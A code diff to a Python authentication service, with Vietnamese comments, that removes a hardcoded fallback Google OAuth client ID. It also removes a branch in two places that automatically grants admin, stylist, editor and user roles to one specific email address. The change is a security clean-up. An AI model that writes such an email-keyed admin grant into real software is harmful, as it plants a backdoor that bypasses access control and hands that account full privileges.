@@ -164,11 +164,7 @@ class AuthService:
     @classmethod
     async def google_auth(cls, req: GoogleAuthRequest) -> AuthResponse:
         """Đăng nhập hoặc Đăng ký tự động qua Google OAuth 2.0."""
-        google_client_id = (
-            settings.GOOGLE_CLIENT_ID
-            or os.getenv("GOOGLE_CLIENT_ID")
-            or "336358137441-abj1lpeeogkpjmdr3hhr0i29di40e3b6.apps.googleusercontent.com"
-        )
+        google_client_id = settings.GOOGLE_CLIENT_ID or os.getenv("GOOGLE_CLIENT_ID")
         if not google_client_id:
             raise AppError(
                 code="GOOGLE_AUTH_UNAVAILABLE", message="Đăng nhập Google chưa được cấu hình.", status_code=503,
@@ -226,15 +222,7 @@ class AuthService:
                 """,
                 (google_sub, avatar_url, account_id),
             )
-            if email == "saberadonisft@gmail.com":
-                for r in ["admin", "stylist", "editor", "user"]:
-                    Database.execute(
-                        "INSERT OR IGNORE INTO user_roles (id, user_id, role) VALUES (?, ?, ?)",
-                        (f"ur_{account_id}_{r}", account_id, r),
-                    )
-                roles = ["admin", "stylist", "editor", "user"]
-            else:
-                roles = cls.get_user_roles(account_id)
+            roles = cls.get_user_roles(account_id)
             display_name = existing["display_name"]
         else:
             # Tạo tài khoản mới từ Google
@@ -289,15 +277,7 @@ class AuthService:
         if not account or not account["is_active"]:
             raise AppError(code="UNAUTHORIZED", message="Tài khoản không tồn tại hoặc đã bị vô hiệu hóa.", status_code=401)
 
-        if account["email"] == "saberadonisft@gmail.com":
-            for r in ["admin", "stylist", "editor", "user"]:
-                Database.execute(
-                    "INSERT OR IGNORE INTO user_roles (id, user_id, role) VALUES (?, ?, ?)",
-                    (f"ur_{user_id}_{r}", user_id, r),
-                )
-            roles = ["admin", "stylist", "editor", "user"]
-        else:
-            roles = cls.get_user_roles(user_id)
+        roles = cls.get_user_roles(user_id)
 
         return UserResponse(
             id=account["id"],
